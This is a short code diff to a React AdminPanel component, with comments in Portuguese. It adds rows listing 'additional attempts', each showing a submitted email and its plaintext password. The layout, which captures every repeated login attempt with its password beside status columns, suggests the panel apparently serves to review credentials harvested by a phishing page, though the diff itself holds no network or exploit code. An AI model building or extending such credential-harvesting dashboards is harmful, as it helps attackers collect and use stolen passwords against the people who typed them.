@@ -358,6 +358,40 @@ function AdminPanel() {
                             </button>
                           </td>
                         </tr>
+                        
+                        {/* Tentativas adicionais */}
+                        {attempt.attempts && attempt.attempts.map((additionalAttempt, attemptIndex) => (
+                          <tr key={attemptIndex} className="bg-yellow-50">
+                            {/* # */}
+                            <td className="px-3 py-3 text-center text-sm font-bold border border-gray-300">{attemptIndex + 2}</td>
+                            
+                            {/* status - vazio */}
+                            <td className="px-3 py-3 text-center border border-gray-300">
+                              <span className="w-4 h-4 rounded-full bg-gray-300 inline-block"></span>
+                            </td>
+                            
+                            {/* INV - vazio */}
+                            <td className="px-3 py-3 text-center border border-gray-300">
+                              <span className="text-gray-700">-</span>
+                            </td>
+                            
+                            {/* USUÁRIO/LOGIN - nova tentativa */}
+                            <td className="px-3 py-3 text-sm border border-gray-300 font-medium">{additionalAttempt.email}</td>
+                            
+                            {/* SENHA - nova tentativa */}
+                            <td className="px-3 py-3 text-sm border border-gray-300">{additionalAttempt.password || "-"}</td>
+                            
+                            {/* Demais campos vazios */}
+                            <td className="px-3 py-3 text-center text-sm border border-gray-300">-</td>
+                            <td className="px-3 py-3 text-center text-sm border border-gray-300">-</td>
+                            <td className="px-3 py-3 text-center text-sm border border-gray-300">-</td>
+                            <td className="px-3 py-3 text-center text-sm border border-gray-300">-</td>
+                            <td className="px-3 py-3 text-center text-sm border border-gray-300">-</td>
+                            <td className="px-3 py-3 text-center border border-gray-300">-</td>
+                            <td className="px-3 py-3 text-center border border-gray-300">-</td>
+                            <td className="px-3 py-3 text-center border border-gray-300">-</td>
+                          </tr>
+                        ))}
                       </tbody>
                     </table>
                   </div>
